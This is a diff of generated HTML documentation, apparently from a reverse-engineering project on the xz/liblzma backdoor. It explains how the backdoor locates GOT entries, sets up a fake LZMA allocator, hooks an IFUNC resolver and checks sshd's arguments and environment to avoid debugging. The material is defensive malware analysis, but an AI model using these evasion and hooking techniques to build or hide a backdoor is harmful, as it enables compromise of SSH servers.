+<dl class="params"><dt>Parameters</dt><dd>
+  <table class="params">
+    <tr><td class="paramname">opaque</td><td>not used </td></tr>
+    <tr><td class="paramname">ptr</td><td>not used </td></tr>
+  </table>
+  </dd>
+</dl>
+
+</div>
+</div>
 <a id="a41fada894916f4c67d59090ff57aead1"></a>
 <h2 class="memtitle"><span class="permalink"><a href="#a41fada894916f4c67d59090ff57aead1">&#9670;&nbsp;</a></span>find_call_instruction()</h2>
 
@@ -2408,6 +2794,86 @@ lzma_allocator *&#160;</td><td class="memItemRight" valign="bottom"><b>fake_lzma
 
 </div>
 </div>
+<a id="aee7738c9cab5f6733c666e0a20e5ba99"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#aee7738c9cab5f6733c666e0a20e5ba99">&#9670;&nbsp;</a></span>get_cpuid_got_index()</h2>
+
+<div class="memitem">
+<div class="memproto">
+      <table class="memname">
+        <tr>
+          <td class="memname">u64 get_cpuid_got_index </td>
+          <td>(</td>
+          <td class="paramtype"><a class="el" href="structelf__entry__ctx__t.html">elf_entry_ctx_t</a> *&#160;</td>
+          <td class="paramname"><em>ctx</em></td><td>)</td>
+          <td></td>
+        </tr>
+      </table>
+</div><div class="memdoc">
+
+<p>get the cpuid() GOT index </p>
+<p>stores the index in <a class="el" href="structelf__entry__ctx__t.html#a85a0fbf801aa8ab7ab1d2f0906dc3971" title="points to the real cpuid function">elf_entry_ctx_t::cpuid_fn</a></p>
+<dl class="params"><dt>Parameters</dt><dd>
+  <table class="params">
+    <tr><td class="paramname">ctx</td><td></td></tr>
+  </table>
+  </dd>
+</dl>
+<dl class="section return"><dt>Returns</dt><dd>u64 cpuid() GOT index </dd></dl>
+
+</div>
+</div>
+<a id="aa3c963b13e204d9d99ab57a5647e9b45"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#aa3c963b13e204d9d99ab57a5647e9b45">&#9670;&nbsp;</a></span>get_elf_functions_address()</h2>
+
+<div class="memitem">
+<div class="memproto">
+      <table class="memname">
+        <tr>
+          <td class="memname"><a class="el" href="structelf__functions__t.html">elf_functions_t</a>* get_elf_functions_address </td>
+          <td>(</td>
+          <td class="paramname"></td><td>)</td>
+          <td></td>
+        </tr>
+      </table>
+</div><div class="memdoc">
+
+<p>gets the address of the elf_functions </p>
+<p>uses elf_functions_offset to get the address 0x2a0 bytes before elf_functions and then adds 0x268 to get the final address of elf_functions</p><ul>
+<li><dl class="section return"><dt>Returns</dt><dd>elf_functions_t* </dd></dl>
+</li>
+</ul>
+
+</div>
+</div>
+<a id="ad33792d2db40b95a7b434081d1608ca4"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#ad33792d2db40b95a7b434081d1608ca4">&#9670;&nbsp;</a></span>get_got_offset()</h2>
+
+<div class="memitem">
+<div class="memproto">
+      <table class="memname">
+        <tr>
+          <td class="memname">ptrdiff_t get_got_offset </td>
+          <td>(</td>
+          <td class="paramtype"><a class="el" href="structelf__entry__ctx__t.html">elf_entry_ctx_t</a> *&#160;</td>
+          <td class="paramname"><em>ctx</em></td><td>)</td>
+          <td></td>
+        </tr>
+      </table>
+</div><div class="memdoc">
+
+<p>get the offset to the GOT </p>
+<p>the offset is relative to the address of the symbol cpuid_random_symbol</p>
+<p>stores the offset in <a class="el" href="structelf__entry__ctx__t.html#af75bd9706dff28ecdc39c1c14765e873" title="holds the offset of the symbol relative to the GOT. used to derive the got_ptr">elf_entry_ctx_t::got_offset</a></p>
+<dl class="params"><dt>Parameters</dt><dd>
+  <table class="params">
+    <tr><td class="paramname">ctx</td><td></td></tr>
+  </table>
+  </dd>
+</dl>
+<dl class="section return"><dt>Returns</dt><dd>ptrdiff_t offset to GOT from the symbol cpuid_random_symbol </dd></dl>
+
+</div>
+</div>
 <a id="abc618a02e31b94194ce03b0c4a2b3597"></a>
 <h2 class="memtitle"><span class="permalink"><a href="#abc618a02e31b94194ce03b0c4a2b3597">&#9670;&nbsp;</a></span>get_lzma_allocator()</h2>
 
@@ -2425,6 +2891,28 @@ lzma_allocator *&#160;</td><td class="memItemRight" valign="bottom"><b>fake_lzma
 
 <p>gets the fake LZMA allocator, used for imports resolution the "opaque" field of the structure holds a pointer to </p>
 <dl class="section see"><dt>See also</dt><dd>elf_info_t</dd></dl>
+<dl class="section return"><dt>Returns</dt><dd>lzma_allocator* </dd></dl>
+
+</div>
+</div>
+<a id="a69f76638809572b5f358545f8fb8035e"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#a69f76638809572b5f358545f8fb8035e">&#9670;&nbsp;</a></span>get_lzma_allocator_address()</h2>
+
+<div class="memitem">
+<div class="memproto">
+      <table class="memname">
+        <tr>
+          <td class="memname">void* get_lzma_allocator_address </td>
+          <td>(</td>
+          <td class="paramname"></td><td>)</td>
+          <td></td>
+        </tr>
+      </table>
+</div><div class="memdoc">
+
+<p>gets the address of the fake LZMA allocator </p>
+<p>uses fake_lzma_allocator_offset to get the address 0x180 bytes before fake_lzma_allocator and then adds 0x160 to get the final address of fake_lzma_allocator</p>
+<p>called in <a class="el" href="xzre_8h.html#abc618a02e31b94194ce03b0c4a2b3597" title="gets the fake LZMA allocator, used for imports resolution the &quot;opaque&quot; field of the structure holds a...">get_lzma_allocator()</a></p>
 <dl class="section return"><dt>Returns</dt><dd>lzma_allocator* </dd></dl>
 
 </div>
@@ -2473,6 +2961,62 @@ lzma_allocator *&#160;</td><td class="memItemRight" valign="bottom"><b>fake_lzma
 
 </div>
 </div>
+<a id="ae20580c7a069afb3b578f060582867df"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#ae20580c7a069afb3b578f060582867df">&#9670;&nbsp;</a></span>get_tls_get_addr_random_symbol_got_offset()</h2>
+
+<div class="memitem">
+<div class="memproto">
+      <table class="memname">
+        <tr>
+          <td class="memname">ptrdiff_t get_tls_get_addr_random_symbol_got_offset </td>
+          <td>(</td>
+          <td class="paramtype"><a class="el" href="structelf__entry__ctx__t.html">elf_entry_ctx_t</a> *&#160;</td>
+          <td class="paramname"><em>ctx</em></td><td>)</td>
+          <td></td>
+        </tr>
+      </table>
+</div><div class="memdoc">
+
+<p>get the tls_get_addr_random_symbol GOT offset </p>
+<p>sets <a class="el" href="structelf__entry__ctx__t.html#a981d9d100fcb877d5c77a16059bd47ac" title="points to the Global Offset Table">elf_entry_ctx_t::got_ptr</a> = 0x2600 stores the index in <a class="el" href="structelf__entry__ctx__t.html#af75bd9706dff28ecdc39c1c14765e873" title="holds the offset of the symbol relative to the GOT. used to derive the got_ptr">elf_entry_ctx_t::got_offset</a></p>
+<dl class="params"><dt>Parameters</dt><dd>
+  <table class="params">
+    <tr><td class="paramname">ctx</td><td></td></tr>
+  </table>
+  </dd>
+</dl>
+<dl class="section return"><dt>Returns</dt><dd>ptrdiff_t tls_get_addr_random_symbol GOT offset </dd></dl>
+
+</div>
+</div>
+<a id="abf19222b4917f772ad487a2970dd51ec"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#abf19222b4917f772ad487a2970dd51ec">&#9670;&nbsp;</a></span>init_elf_entry_ctx()</h2>
+
+<div class="memitem">
+<div class="memproto">
+      <table class="memname">
+        <tr>
+          <td class="memname">ptrdiff_t init_elf_entry_ctx </td>
+          <td>(</td>
+          <td class="paramtype"><a class="el" href="structelf__entry__ctx__t.html">elf_entry_ctx_t</a> *&#160;</td>
+          <td class="paramname"><em>ctx</em></td><td>)</td>
+          <td></td>
+        </tr>
+      </table>
+</div><div class="memdoc">
+
+<p>initialises the <a class="el" href="structelf__entry__ctx__t.html">elf_entry_ctx_t</a> </p>
+<p>stores the address of the symbol cpuid_random_symbol in <a class="el" href="structelf__entry__ctx__t.html#ad01fe86502a221ee8a55703ca7875f58" title="points to a symbol in memory will be used to find the GOT value">elf_entry_ctx_t::symbol_ptr</a> stores the return address of the function that called the IFUNC resolver which is a stack address in ld.so calls <a class="el" href="xzre_8h.html#ad33792d2db40b95a7b434081d1608ca4" title="get the offset to the GOT">get_got_offset()</a> to update <a class="el" href="structelf__entry__ctx__t.html#af75bd9706dff28ecdc39c1c14765e873" title="holds the offset of the symbol relative to the GOT. used to derive the got_ptr">elf_entry_ctx_t::got_offset</a> calls <a class="el" href="xzre_8h.html#aee7738c9cab5f6733c666e0a20e5ba99" title="get the cpuid() GOT index">get_cpuid_got_index()</a> to update <a class="el" href="structelf__entry__ctx__t.html#a85a0fbf801aa8ab7ab1d2f0906dc3971" title="points to the real cpuid function">elf_entry_ctx_t::cpuid_fn</a></p>
+<dl class="params"><dt>Parameters</dt><dd>
+  <table class="params">
+    <tr><td class="paramname">ctx</td><td></td></tr>
+  </table>
+  </dd>
+</dl>
+<dl class="section return"><dt>Returns</dt><dd>ptrdiff_t always 0 </dd></dl>
+
+</div>
+</div>
 <a id="abbcfd61778019372e0cabdf79b98824d"></a>
 <h2 class="memtitle"><span class="permalink"><a href="#abbcfd61778019372e0cabdf79b98824d">&#9670;&nbsp;</a></span>init_hook_functions()</h2>
 
@@ -2490,6 +3034,7 @@ lzma_allocator *&#160;</td><td class="memItemRight" valign="bottom"><b>fake_lzma
 </div><div class="memdoc">
 
 <p>Initializes the structure with hooks-related data. </p>
+<p>Grabs the call addresses of the internal functions that will be installed into the hook locations.</p>
 <dl class="params"><dt>Parameters</dt><dd>
   <table class="params">
     <tr><td class="paramname">funcs</td><td></td></tr>
@@ -2561,14 +3106,26 @@ lzma_allocator *&#160;</td><td class="memItemRight" valign="bottom"><b>fake_lzma
       </table>
 </div><div class="memdoc">
 
-<p>parses the main executable from the provided structure. as part of the process, argv0 will be retrieved and checked to see if it's the expected one (/usr/sbin/sshd) </p>
+<p>parses the main executable from the provided structure as part of the process the arguments and environment is checked </p>
+<p>argv[0] is checked that it is "/usr/sbin/sshd" the remaining args are checked that they all start with '-' the args are checked that they do not contain the '-d' or '-D' flags (which set sshd into debug or non-daemon mode) the args are are also checked that there is not any '\t' or '=' characters in the args the environment variable strings are checked that they do not start with any string from the encoded string table in particular these environment strings:</p><ul>
+<li>"DISPLAY="</li>
+<li>"LD_AUDIT="</li>
+<li>"LD_BIND_NOT="</li>
+<li>"LD_DEBUG="</li>
+<li>"LD_PROFILE="</li>
+<li>"LD_USE_LOAD_BIAS="</li>
+<li>"LINES="</li>
+<li>"TERM="</li>
+<li>"WAYLAND_DISPLAY="</li>
+<li>"yolAbejyiejuvnup=Evjtgvsh5okmkAvj"</li>
+</ul>
 <dl class="params"><dt>Parameters</dt><dd>
   <table class="params">
     <tr><td class="paramname">main_elf</td><td>the main executable to parse </td></tr>
   </table>
   </dd>
 </dl>
-<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful, FALSE otherwise </dd></dl>
+<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful (and all checks passed), FALSE otherwise </dd></dl>
 
 </div>
 </div>
@@ -2962,14 +3519,14 @@ lzma_allocator *&#160;</td><td class="memItemRight" valign="bottom"><b>fake_lzma
 
 </div>
 </div>
-<a id="a8cc394dd9e788d2b5166eedb8b155d1e"></a>
-<h2 class="memtitle"><span class="permalink"><a href="#a8cc394dd9e788d2b5166eedb8b155d1e">&#9670;&nbsp;</a></span>update_got_address()</h2>
+<a id="ad3a61f27a1663eb3e0b25b861c85fe3c"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#ad3a61f27a1663eb3e0b25b861c85fe3c">&#9670;&nbsp;</a></span>update_got_address()</h2>
 
 <div class="memitem">
 <div class="memproto">
       <table class="memname">
         <tr>
-          <td class="memname">void update_got_address </td>
+          <td class="memname">void* update_got_address </td>
           <td>(</td>
           <td class="paramtype"><a class="el" href="structelf__entry__ctx__t.html">elf_entry_ctx_t</a> *&#160;</td>
           <td class="paramname"><em>entry_ctx</em></td><td>)</td>
@@ -2978,13 +3535,18 @@ lzma_allocator *&#160;</td><td class="memItemRight" valign="bottom"><b>fake_lzma
       </table>
 </div><div class="memdoc">
 
-<p>recomputes the GOT address </p>
+<p>finds the __tls_get_addr() GOT entry </p>
+<p>this function first computes the location of the __tls_get_addr() PLT trampoline function by using the PLT offset constant from tls_get_addr_reloc_consts</p>
+<p>then it decodes the PLT jmp instruction to get the address of the __tls_get_addr() GOT entry</p>
+<p>the __tls_get_addr() GOT entry is used in <a class="el" href="xzre_8h.html#a229ee0bd4111363061bc4230bc1f6423" title="the backdoor main method">backdoor_setup()</a> to find the ELF header at the start of the memory mapped ld.so</p>
+<p>calls <a class="el" href="xzre_8h.html#ae20580c7a069afb3b578f060582867df" title="get the tls_get_addr_random_symbol GOT offset">get_tls_get_addr_random_symbol_got_offset()</a> to update <a class="el" href="structelf__entry__ctx__t.html#a981d9d100fcb877d5c77a16059bd47ac" title="points to the Global Offset Table">elf_entry_ctx_t::got_ptr</a> and <a class="el" href="structelf__entry__ctx__t.html#af75bd9706dff28ecdc39c1c14765e873" title="holds the offset of the symbol relative to the GOT. used to derive the got_ptr">elf_entry_ctx_t::got_offset</a> sets <a class="el" href="structelf__entry__ctx__t.html#af75bd9706dff28ecdc39c1c14765e873" title="holds the offset of the symbol relative to the GOT. used to derive the got_ptr">elf_entry_ctx_t::got_offset</a> = 0 sets <a class="el" href="structelf__entry__ctx__t.html#a85a0fbf801aa8ab7ab1d2f0906dc3971" title="points to the real cpuid function">elf_entry_ctx_t::cpuid_fn</a> = 0 stores the address of the __tls_get_addr() GOT entry in <a class="el" href="structelf__entry__ctx__t.html#a981d9d100fcb877d5c77a16059bd47ac" title="points to the Global Offset Table">elf_entry_ctx_t::got_ptr</a></p>
 <dl class="params"><dt>Parameters</dt><dd>
   <table class="params">
     <tr><td class="paramname">entry_ctx</td><td></td></tr>
   </table>
   </dd>
 </dl>
+<dl class="section return"><dt>Returns</dt><dd>void* the address of the __tls_get_addr() GOT entry </dd></dl>
 
 </div>
 </div>
@@ -3030,6 +3592,243 @@ lzma_allocator *&#160;</td><td class="memItemRight" valign="bottom"><b>fake_lzma
   </dd>
 </dl>
 <dl class="section return"><dt>Returns</dt><dd>int TRUE if disassembly was successful, FALSE otherwise </dd></dl>
+
+</div>
+</div>
+<h2 class="groupheader">Variable Documentation</h2>
+<a id="ac7d6a45076bf21904bac3163ae57090e"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#ac7d6a45076bf21904bac3163ae57090e">&#9670;&nbsp;</a></span>cpuid_random_symbol</h2>
+
+<div class="memitem">
+<div class="memproto">
+<table class="mlabels">
+  <tr>
+  <td class="mlabels-left">
+      <table class="memname">
+        <tr>
+          <td class="memname">const u64 cpuid_random_symbol</td>
+        </tr>
+      </table>
+  </td>
+  <td class="mlabels-right">
+<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
+  </tr>
+</table>
+</div><div class="memdoc">
+
+<p>a bogus global variable that is used by the backdoor to generate an extra symbol </p>
+<p>the symbol is used by <a class="el" href="xzre_8h.html#abf19222b4917f772ad487a2970dd51ec" title="initialises the elf_entry_ctx_t">init_elf_entry_ctx()</a> </p>
+
+</div>
+</div>
+<a id="a6ee0871d6d6f7544176777c8f00244b7"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#a6ee0871d6d6f7544176777c8f00244b7">&#9670;&nbsp;</a></span>cpuid_reloc_consts</h2>
+
+<div class="memitem">
+<div class="memproto">
+<table class="mlabels">
+  <tr>
+  <td class="mlabels-left">
+      <table class="memname">
+        <tr>
+          <td class="memname">const <a class="el" href="structbackdoor__cpuid__reloc__consts__t.html">backdoor_cpuid_reloc_consts_t</a> cpuid_reloc_consts</td>
+        </tr>
+      </table>
+  </td>
+  <td class="mlabels-right">
+<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
+  </tr>
+</table>
+</div><div class="memdoc">
+
+<p>special section that contains <a class="el" href="xzre_8h.html#aed5d1b3446090d6186a41841fb282df1" title="actually calls cpuid instruction">_cpuid()</a> related GOT offsets </p>
+<p>liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets</p>
+<p>used by <a class="el" href="xzre_8h.html#ac7c10c84bc0699f1ba58698764ae0258" title="calls backdoor_init_stage2()">call_backdoor_init_stage2()</a>, <a class="el" href="xzre_8h.html#ad33792d2db40b95a7b434081d1608ca4" title="get the offset to the GOT">get_got_offset()</a> and <a class="el" href="xzre_8h.html#aee7738c9cab5f6733c666e0a20e5ba99" title="get the cpuid() GOT index">get_cpuid_got_index()</a> </p>
+
+</div>
+</div>
+<a id="a43a1216740525fdfa050474fc9b91a57"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#a43a1216740525fdfa050474fc9b91a57">&#9670;&nbsp;</a></span>elf_functions</h2>
+
+<div class="memitem">
+<div class="memproto">
+<table class="mlabels">
+  <tr>
+  <td class="mlabels-left">
+      <table class="memname">
+        <tr>
+          <td class="memname">const <a class="el" href="structelf__functions__t.html">elf_functions_t</a> elf_functions</td>
+        </tr>
+      </table>
+  </td>
+  <td class="mlabels-right">
+<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
+  </tr>
+</table>
+</div><div class="memdoc">
+
+<p>special section that contains addresses to various functions </p>
+<p>appears to be another obfuscation attempt</p>
+<p>liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets</p>
+<p>used by <a class="el" href="xzre_8h.html#ad3a61f27a1663eb3e0b25b861c85fe3c" title="finds the __tls_get_addr() GOT entry">update_got_address()</a> and <a class="el" href="xzre_8h.html#ae20580c7a069afb3b578f060582867df" title="get the tls_get_addr_random_symbol GOT offset">get_tls_get_addr_random_symbol_got_offset()</a></p>
+<p>used by </p>
+
+</div>
+</div>
+<a id="a4623e8d4254091bcbffbead1ee7ed2ff"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#a4623e8d4254091bcbffbead1ee7ed2ff">&#9670;&nbsp;</a></span>elf_functions_offset</h2>
+
+<div class="memitem">
+<div class="memproto">
+<table class="mlabels">
+  <tr>
+  <td class="mlabels-left">
+      <table class="memname">
+        <tr>
+          <td class="memname">const ptrdiff_t elf_functions_offset</td>
+        </tr>
+      </table>
+  </td>
+  <td class="mlabels-right">
+<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
+  </tr>
+</table>
+</div><div class="memdoc">
+
+<p>special section that contains the offset to elf_functions </p>
+<p>liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets</p>
+<p>the variable maps to a relocation entry of type R_X86_64_64 and value elf_functions-0x2a0 </p>
+
+</div>
+</div>
+<a id="a678f0c54a17ceaf00ce3a00edb27de10"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#a678f0c54a17ceaf00ce3a00edb27de10">&#9670;&nbsp;</a></span>fake_lzma_allocator</h2>
+
+<div class="memitem">
+<div class="memproto">
+<table class="mlabels">
+  <tr>
+  <td class="mlabels-left">
+      <table class="memname">
+        <tr>
+          <td class="memname">lzma_allocator* fake_lzma_allocator</td>
+        </tr>
+      </table>
+  </td>
+  <td class="mlabels-right">
+<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
+  </tr>
+</table>
+</div><div class="memdoc">
+
+<p>the fake lzma_allocator which makes lzma_alloc() call <a class="el" href="xzre_8h.html#aeb6b7e7363a9d706fdd3704ef5faf584" title="a fake free function called by lzma_free() that then calls elf_symbol_get_addr()">fake_lzma_alloc()</a> </p>
+<p>liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets</p>
+<p>lzma_allocator::alloc is the address of <a class="el" href="xzre_8h.html#aeb6b7e7363a9d706fdd3704ef5faf584" title="a fake free function called by lzma_free() that then calls elf_symbol_get_addr()">fake_lzma_alloc()</a> the field maps to a relocation entry of type R_X86_64_64 and value fake_lzma_alloc</p>
+<p>lzma_allocator::free is the address of <a class="el" href="xzre_8h.html#a5565761b59b3ef6786b83a9b50f72b17" title="a fake free function called by lzma_free()">fake_lzma_free()</a> the field maps to a relocation entry of type R_X86_64_64 and value fake_lzma_free</p>
+<p>lzma_allocator::opaque is the address of <a class="el" href="xzre_8h.html#a52d510f0bbb31de19d8d20bf1acaeb5f" title="disassembles the given x64 code">x86_dasm()</a> the field maps to a relocation entry of type R_X86_64_64 and value x86_dasm </p>
+
+</div>
+</div>
+<a id="aaab5bc3cf0e40bb0aa5bc72a3fd05fbe"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#aaab5bc3cf0e40bb0aa5bc72a3fd05fbe">&#9670;&nbsp;</a></span>fake_lzma_allocator_offset</h2>
+
+<div class="memitem">
+<div class="memproto">
+<table class="mlabels">
+  <tr>
+  <td class="mlabels-left">
+      <table class="memname">
+        <tr>
+          <td class="memname">const ptrdiff_t fake_lzma_allocator_offset</td>
+        </tr>
+      </table>
+  </td>
+  <td class="mlabels-right">
+<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
+  </tr>
+</table>
+</div><div class="memdoc">
+
+<p>special section that contains the offset to lzma_allocator_struct </p>
+<p>liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets</p>
+<p>the variable maps to a relocation entry of type R_X86_64_GOTOFF64 and value cpuid_random_symbol-0x180</p>
+<p>used by <a class="el" href="xzre_8h.html#a69f76638809572b5f358545f8fb8035e" title="gets the address of the fake LZMA allocator">get_lzma_allocator_address()</a> </p>
+
+</div>
+</div>
+<a id="ab9c7b9765c15a48fbed3d1a8daf1b27f"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#ab9c7b9765c15a48fbed3d1a8daf1b27f">&#9670;&nbsp;</a></span>resolver_call_count</h2>
+
+<div class="memitem">
+<div class="memproto">
+<table class="mlabels">
+  <tr>
+  <td class="mlabels-left">
+      <table class="memname">
+        <tr>
+          <td class="memname">u32 resolver_call_count</td>
+        </tr>
+      </table>
+  </td>
+  <td class="mlabels-right">
+<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
+  </tr>
+</table>
+</div><div class="memdoc">
+
+<p>counts the number of times the IFUNC resolver is called </p>
+<p>used by <a class="el" href="xzre_8h.html#a3659cb57f57dd0237ecb194e13d35b19" title="calls call_backdoor_init_stage2() while in the crc64() IFUNC resolver function">backdoor_init()</a> </p>
+
+</div>
+</div>
+<a id="a3101b150fe0226a632314e2fa473aba1"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#a3101b150fe0226a632314e2fa473aba1">&#9670;&nbsp;</a></span>tls_get_addr_random_symbol</h2>
+
+<div class="memitem">
+<div class="memproto">
+<table class="mlabels">
+  <tr>
+  <td class="mlabels-left">
+      <table class="memname">
+        <tr>
+          <td class="memname">const u64 tls_get_addr_random_symbol</td>
+        </tr>
+      </table>
+  </td>
+  <td class="mlabels-right">
+<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
+  </tr>
+</table>
+</div><div class="memdoc">
+
+<p>a bogus global variable that is used by the backdoor to generate an extra symbol </p>
+<p>the symbol is used by <a class="el" href="xzre_8h.html#ad3a61f27a1663eb3e0b25b861c85fe3c" title="finds the __tls_get_addr() GOT entry">update_got_address()</a> </p>
+
+</div>
+</div>
+<a id="aadd306e1b2b33d0306f1995e0a83dae7"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#aadd306e1b2b33d0306f1995e0a83dae7">&#9670;&nbsp;</a></span>tls_get_addr_reloc_consts</h2>
+
+<div class="memitem">
+<div class="memproto">
+<table class="mlabels">
+  <tr>
+  <td class="mlabels-left">
+      <table class="memname">
+        <tr>
+          <td class="memname">const <a class="el" href="structbackdoor__tls__get__addr__reloc__consts__t.html">backdoor_tls_get_addr_reloc_consts_t</a> tls_get_addr_reloc_consts</td>
+        </tr>
+      </table>
+  </td>
+  <td class="mlabels-right">
+<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
+  </tr>
+</table>
+</div><div class="memdoc">
+
+<p>special section that contains __tls_get_addr() related GOT offsets </p>
+<p>liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets</p>
+<p>used by <a class="el" href="xzre_8h.html#ad3a61f27a1663eb3e0b25b861c85fe3c" title="finds the __tls_get_addr() GOT entry">update_got_address()</a> and <a class="el" href="xzre_8h.html#ae20580c7a069afb3b578f060582867df" title="get the tls_get_addr_random_symbol GOT offset">get_tls_get_addr_random_symbol_got_offset()</a> </p>
 
 </div>
 </div>
